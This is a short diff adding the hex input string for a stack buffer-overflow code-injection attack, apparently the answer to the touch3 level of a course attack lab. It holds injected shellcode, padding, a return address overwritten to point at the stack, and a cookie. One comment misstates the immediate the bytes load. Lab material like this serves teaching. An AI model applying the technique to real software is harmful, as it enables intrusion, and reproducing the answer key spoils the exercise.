@@ -1,0 +1,9 @@
+48 c7 c7 b0 dc 61 55 	/* mov    $0x59b997fa,%rdi */
+c3                   	/* retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* end of buffer */
+78 dc 61 55 00 00 00 00	/* exploit code address - beginning of stack */
+fa 18 40 00 00 00 00 00 /* address to touch3 */
+35 39 62 39 39 37 66 61 00 /* cookie */
